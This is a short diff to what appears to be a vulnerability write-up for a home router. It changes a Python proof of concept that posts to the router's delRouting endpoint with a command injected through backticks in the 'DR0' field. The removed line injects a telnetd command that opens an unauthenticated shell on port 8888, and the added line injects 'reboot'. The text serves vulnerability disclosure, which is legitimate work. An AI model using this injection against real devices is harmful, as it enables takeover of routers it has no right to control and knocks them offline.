@@ -44,9 +44,8 @@ url = 'http://192.168.0.1/goform/delRouting'
 
 data = {
     'tokenid': tokenid,
-    'DR0': a`telnetd -l /bin/sh -p 8888 -b 0.0.0.0` b c
+    'DR0': a`reboot` b c
 }
 
 r = requests.post(url, data)
 ```
-![image-20250310200032](./img/5.png)
